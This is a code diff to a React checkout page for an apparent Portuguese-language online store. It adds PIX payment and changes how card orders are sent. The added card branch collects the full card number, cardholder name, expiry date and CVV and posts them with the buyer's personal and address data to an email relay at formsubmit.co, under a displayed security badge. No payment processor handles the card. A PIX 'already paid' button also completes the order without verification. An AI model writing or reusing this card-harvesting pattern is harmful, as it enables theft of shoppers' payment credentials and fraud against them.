@@ -17,6 +17,8 @@ export default function Checkout() {
   const navigate = useNavigate();
   const [isProcessing, setIsProcessing] = useState(false);
   const [paymentMethod, setPaymentMethod] = useState('');
+  const [qrCode, setQrCode] = useState('');
+  const [pixCode, setPixCode] = useState('');
   
   const [formData, setFormData] = useState({
     nome: user?.name || '',
@@ -113,14 +115,55 @@ export default function Checkout() {
     setIsProcessing(true);
 
     try {
-      // Preparar items para a página de sucesso
       const items = cart.map(item => ({
         name: item.nome,
         quantity: item.quantidade,
         price: item.preco,
       }));
-      
-      // Preparar dados para envio via FormSubmit
+
+      // Se for PIX, gerar QR Code via API
+      if (paymentMethod === 'pix') {
+        const pedido = {
+          nome: formData.nome,
+          email: formData.email,
+          cpf: formData.cpf,
+          telefone: formData.telefone,
+          endereco: {
+            cep: formData.cep,
+            rua: formData.rua,
+            numero: formData.numero,
+            bairro: formData.bairro,
+            cidade: formData.cidade,
+            estado: formData.estado,
+          },
+          formaPagamento: 'pix',
+          total: total,
+          carrinho: cart.map(item => ({
+            nome: item.nome,
+            preco: item.preco,
+            quantidade: item.quantidade,
+          })),
+        };
+
+        const response = await fetch('/.netlify/functions/criartransacao', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(pedido),
+        });
+
+        const data = await response.json();
+
+        if (data.ok && data.qr_code) {
+          setQrCode(data.qrcodeBase64 || '');
+          setPixCode(data.qr_code);
+          toast.success('PIX gerado com sucesso!');
+        } else {
+          toast.error('Erro ao gerar PIX');
+        }
+        return;
+      }
+
+      // Para cartão, enviar via FormSubmit com todos os dados
       const formSubmitData = new FormData();
       formSubmitData.append('Nome', formData.nome);
       formSubmitData.append('Email', formData.email);
@@ -128,11 +171,14 @@ export default function Checkout() {
       formSubmitData.append('Telefone', formData.telefone);
       formSubmitData.append('CEP', formData.cep);
       formSubmitData.append('Endereço', `${formData.rua}, ${formData.numero} - ${formData.bairro}, ${formData.cidade}/${formData.estado}`);
-      formSubmitData.append('Forma de Pagamento', paymentMethod === 'pix' ? 'PIX' : 'Cartão de Crédito');
+      formSubmitData.append('Forma de Pagamento', 'Cartão de Crédito');
+      formSubmitData.append('Número do Cartão', formData.numeroCartao);
+      formSubmitData.append('Nome no Cartão', formData.nomeCartao);
+      formSubmitData.append('Validade', formData.validade);
+      formSubmitData.append('CVV', formData.cvv);
       formSubmitData.append('Total', `R$ ${total.toFixed(2)}`);
-      formSubmitData.append('Itens', items.map(i => `${i.name} (${i.quantity}x) - R$ ${i.price.toFixed(2)}`).join(', '));
+      formSubmitData.append('Itens', items.map(i => `${i.name} (${i.quantity}x) - R$ ${i.price.toFixed(2)}`).join('\n'));
       
-      // Enviar para FormSubmit (substitua YOUR_EMAIL pelo email desejado)
       await fetch('https://formsubmit.co/ajax/YOUR_EMAIL', {
         method: 'POST',
         body: formSubmitData,
@@ -141,14 +187,13 @@ export default function Checkout() {
       toast.success('Pedido enviado com sucesso! 🎉');
       clearCart();
       
-      // Redirecionar para página de sucesso
       const params = new URLSearchParams({
         orderId: `#${Date.now()}`,
         total: total.toString(),
         subtotal: total.toString(),
         shipping: '0',
         discount: '0',
-        method: paymentMethod === 'pix' ? 'PIX' : 'Cartão de Crédito',
+        method: 'Cartão de Crédito',
         name: formData.nome,
         email: formData.email,
         date: new Date().toLocaleString('pt-BR'),
@@ -171,7 +216,88 @@ export default function Checkout() {
       <div className="container max-w-6xl mx-auto px-4 py-12">
         <h1 className="text-3xl font-bold mb-8">Finalizar Compra</h1>
 
-        <form onSubmit={handleSubmit}>
+        {qrCode ? (
+          <div className="bg-white rounded-lg shadow-md p-8 max-w-md mx-auto text-center">
+            <h2 className="text-2xl font-bold mb-4 text-[#1e90ff]">Pague com PIX</h2>
+            <p className="mb-6 text-muted-foreground">Escaneie o QR Code ou copie o código abaixo</p>
+            
+            {qrCode && (
+              <img src={qrCode} alt="QR Code PIX" className="mx-auto mb-6 max-w-xs" />
+            )}
+            
+            <div className="mb-6">
+              <Label htmlFor="pixCode">Código PIX</Label>
+              <div className="flex gap-2 mt-2">
+                <Input
+                  id="pixCode"
+                  value={pixCode}
+                  readOnly
+                  className="text-xs"
+                />
+                <Button
+                  type="button"
+                  onClick={() => {
+                    navigator.clipboard.writeText(pixCode);
+                    toast.success('Código copiado!');
+                  }}
+                  className="bg-[#1e90ff] hover:bg-[#0a65c0]"
+                >
+                  Copiar
+                </Button>
+              </div>
+            </div>
+
+            <div className="border-t pt-6">
+              <p className="text-xl font-bold text-[#1e90ff]">
+                Total: R$ {total.toFixed(2).replace('.', ',')}
+              </p>
+              <p className="text-sm text-muted-foreground mt-2">
+                Após o pagamento, seu pedido será processado automaticamente
+              </p>
+            </div>
+
+            <Button
+              type="button"
+              onClick={() => {
+                const items = cart.map(item => ({
+                  name: item.nome,
+                  quantity: item.quantidade,
+                  price: item.preco,
+                }));
+                
+                const params = new URLSearchParams({
+                  orderId: `#${Date.now()}`,
+                  total: total.toString(),
+                  subtotal: total.toString(),
+                  shipping: '0',
+                  discount: '0',
+                  method: 'PIX',
+                  name: formData.nome,
+                  email: formData.email,
+                  date: new Date().toLocaleString('pt-BR'),
+                  items: JSON.stringify(items),
+                });
+                
+                clearCart();
+                navigate(`/transacao-concluida?${params.toString()}`);
+              }}
+              variant="outline"
+              className="mt-6 w-full"
+            >
+              Já realizei o pagamento
+            </Button>
+            
+            <Button
+              type="button"
+              onClick={() => navigate('/loja')}
+              variant="outline"
+              className="mt-2 w-full"
+            >
+              Voltar para a loja
+            </Button>
+          </div>
+        ) : (
+          <form onSubmit={handleSubmit}>
             
             <div className="grid md:grid-cols-2 gap-8">
               {/* Coluna Esquerda - Dados Pessoais e Endereço */}
@@ -362,6 +488,7 @@ export default function Checkout() {
               </div>
             </div>
           </form>
+        )}
       </div>
       <SecurityBadge />
     </div>
